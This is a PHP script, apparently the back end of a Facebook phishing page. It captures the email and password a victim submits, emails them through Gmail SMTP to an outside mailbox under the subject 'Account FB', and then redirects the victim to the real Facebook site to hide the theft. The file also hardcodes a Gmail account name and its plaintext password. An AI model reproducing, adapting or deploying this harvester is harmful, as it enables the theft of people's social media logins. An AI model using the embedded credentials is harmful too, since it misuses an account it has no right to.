<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require('PHPMailer/src/Exception.php');
require('PHPMailer/src/PHPMailer.php');
require('PHPMailer/src/SMTP.php');


if($_POST){

    $mail = new PHPMailer(true);
    try {
      
        $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
        $mail->isSMTP();   
        
        $mail->Host = "smtp.gmail.com";
        $mail->SMTPAuth = true; // authentication enabled
      
        $mail->Username = 'huynguyen66028@gmail.com';
        $mail->Password = 'anphawolf@%)$1997';
        $mail->SMTPSecure = 'ssl';
        $mail->Port = 465; // or 587
      
        $mail->setFrom('huynguyen66028@gmail.com', 'Huy Nguyen');
        $mail->addAddress('anphawolf@gmail.com');

        $mail->isHTML(true);  
        $mail->Subject = 'Account FB';
        $mail->Body = ' username: '.$_POST['email'] .' <br>
                        password: '.$_POST['pass'].'  ';
        

        $mail->send();
        header("Location: https://www.facebook.com/"); 

    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }

}



?>